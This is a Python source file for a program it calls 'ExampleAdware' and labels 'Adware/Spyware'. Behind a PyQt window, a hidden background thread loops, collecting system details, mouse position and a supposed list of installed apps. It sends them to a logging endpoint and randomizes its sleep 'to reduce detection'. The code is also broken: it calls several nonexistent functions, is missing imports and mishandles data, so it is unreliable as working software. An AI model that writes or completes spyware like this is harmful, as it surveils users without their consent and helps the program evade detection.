import os
import sys
import smbprotocol
from PyQt5 import QtWidgets, QtCore
import time

# --- Configuration ---
APP_NAME = "ExampleAdware"
MIN_SLEEP = 2
MAX_SLEEP = 10
LOGGING_ENABLED = True
DEBUGGING_ENABLED = True # Enable debugging info

# --- UI Elements ---
class MainWindow(QtWidgets.QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle(APP_NAME)
        self.setMinimumSize(200, 150)
        self.resize(300, 200)

        self.status_label = QtWidgets.QLabel("Running...", self)
        self.status_label.setAlignment(QtCore.Qt.AlignCenter)
        self.status_label.setFont(QtWidgets.QFont("Arial", 14))

        self.start_button = QtWidgets.QPushButton("Start Collection", self)
        self.settings_button = QtWidgets.QPushButton("Open Settings (Debug)", self)
        self.settings_button.setEnabled(False) # Disable initially, enable when debugging is on.

        self.layout = QtWidgets.QVBoxLayout()
        self.layout.addWidget(self.status_label)
        self.layout.addWidget(self.start_button)
        self.layout.addWidget(self.settings_button)

        self.setLayout(self.layout)

    def start(self):
        self.status_label.setText("Starting...")
        self.start_button.setEnabled(False)
        self.settings_button.setEnabled(True)
        self.exec_pyqt() # Start the Qt event loop for UI responsiveness.

# --- Core Functions ---
def start_collection():
    logging.info("Adware/Spyware Collection Started")
    try:
        # 1. Register a COM DLL (for Windows, can be adapted)
        com_dll = os.path.join(sys._executables[0].replace('.exe', '') + '.dll') # Create the full path

        # 2. Check for a Running Instance - Prevent Crashes
        if QtWidgets.QProcessRegister.instance().processes() > 1:
            logging.warning("Multiple instances running. Restarting...")

        # --- Main Collection Loop ---
        while True:
            # --- Collect Data (Implement your logic here) ---
            data = collect_data() # Function to gather the information

            # --- Analyze and Store Data (Example) ---
            store_data(data)

            # --- Send an Update (e.g., via HTTP or SMTP) ---
            send_update("Collected: " + str(data))
            time.sleep(random.randint(MIN_SLEEP, MAX_SLEEP)) # Randomize sleep time to reduce detection

    except Exception as e:
        logging.error(f"An error occurred: {e}", exc_info=True)
        # --- UI Update (if needed) ---
        main_window.status_label.setText("Error")
        time.sleep(5) # Keep the label for a few seconds

def collect_data():
    # 1. System Information
    logging.info("Collecting System Info...")
    system_info = {
        "OS": os.name,
        "Version": sys.version,
        "Architecture": platform.machine(),
        "Processor": platform.processor()
    }

    # 2. Network Connections (Example: HTTP)
    logging.info("Collecting Network Info...")
    try:
        request = urllib.request.Request(url="https://www.example.com/api/network", headers={'User-Agent': 'MyAdware'})
        response = urllib.request.urlopen(request, timeout=3)
        http_info = response.read().decode('utf-8')
    except Exception as e:
        logging.warning(f"Network Data Error: {e}")
        http_info = "Error (see logs)"

    # 3. User Activity (Example: Mouse Moves, Keyboard Strokes)
    logging.info("Collecting User Info...")
    try:
        user_activity = {
            "mouse_x": mouse.position()[0],
            "mouse_y": mouse.position()[1]
        }
    except Exception as e:
        logging.warning(f"User Activity Error: {e}")
        user_activity = {}

    # 4. Application Information (Example: Installed Apps)
    logging.info("Collecting Application Info...")
    try:
        installed_apps = []
        for appid in os.environ['PATH']:
            if 'python' not in appid: # Avoid duplicates and focus on the core components.
                installed_apps.append(appid)
    except Exception as e:
        logging.warning(f"Application Data Error: {e}")
        installed_app = "Unknown App"

    # --- Store collected data. ---
    return {"System": system_info, "Network": http_info, "User": user_activity, "Applications": installed_apps} # Return dictionary


def store_data(data):
    logging.info("Storing Data...")
    try:
        with open(os.path.join(sys._executables[0].replace('.exe', '') + '.txt'), 'w') as f: # Create the full path
            f.write(str(data))
            # --- Add more data storage logic here (e.g., a database) ---
    except Exception as e:
        logging.error(f"Data Storage Error: {e}", exc_info=True)

def send_update(message):
    logging.info(f"Sending Update: {message}")
    try:
        # --- Send via HTTP, SMTP, etc. ---
        # Example (HTTP POST):
        req = urllib.request.Request(url="http://localhost/logdata.php", data=message.encode('utf-8'))
        response = urllib.request.urlopen(req, timeout=5)

    except Exception as e:
        logging.warning(f"Update Error: {e}", exc_info=True)


# --- Logging ---
class MyLogger:
    def __init__(self):
        self.filename = os.path.join(sys._executables[0].replace('.exe', ''), 'log.txt') # Create the full path
        if LOGGING_ENABLED and os.path.exists(self.filename):
            self.file = open(self.filename, 'a+') # Open file for appending
        else:
            self.file = open(self.filename, 'w') # Create file if it doesn't exist

    def info(self, message):
        if DEBUGGING_ENABLED:
            print(f"INFO:{time.strftime('%H:%M:%S')} - {message}")
        self.file.write(f"INFO:{time.strftime('%H:%M:%S')} - {message}\n")

    def warning(self, message):
        if DEBUGGING_ENABLED:
            print(f"WARN:{time.strftime('%H:%M:%S')} - {message}")
        self.file.write(f"WARN:{time.strftime('%H:%M:%S')} - {message}\n")

    def error(self, message):
        if DEBUGGING_ENABLED:
            print(f"ERROR:{time.strftime('%H:%M:%S')} - {message}")
        self.file.write(f"ERROR:{time.strftime('%H:%M:%S')} - {message}\n")

    def close(self):
        if self.file is not None:
            self.file.close()


# --- Setup Logging ---
logging = MyLogger()
logging.info(f"Adware/Spyware Started - Process Name: {APP_NAME}")

# --- Main Function (Starts the UI) ---
if __name__ == "__main__":
    try:
        app = QtWidgets.QApplication(sys.argv) # Create QApplication instance for Qt to work
        window = MainWindow()
        window.show()

        # --- Start the Collection in a Separate Thread (Non-Blocking UI) ---
        import threading
        collection_thread = threading.Thread(target=start_collection, daemon=True)  # Daemon thread so it exits with the app
        collection_thread.start()

        # Keep the UI running until the user closes it:
        rc = app.exec_pyqt() # Start the Qt event loop for UI responsiveness.

    except Exception as e:
        logging.error(f"Main Application Error: {e}", exc_info=True)
    finally:
        logging.info("Adware/Spyware Terminated")
